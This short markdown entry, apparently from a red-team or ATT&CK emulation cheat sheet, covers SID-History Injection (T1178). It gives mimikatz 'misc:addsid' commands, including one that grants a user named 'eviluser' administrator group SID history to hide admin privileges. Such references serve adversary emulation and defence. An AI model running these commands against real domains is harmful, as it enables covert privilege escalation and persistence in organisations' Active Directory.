# SID-History Injection
MITRE ATT&CK Technique: [T1178](https://attack.mitre.org/wiki/Technique/T1178)
## Create a new domain user. Hide admin privileges with SID history
`mimikatz "misc:addsid <user> <groups>"`  
`mimikatz "misc:addsid eviluser ADSAdministrator"`
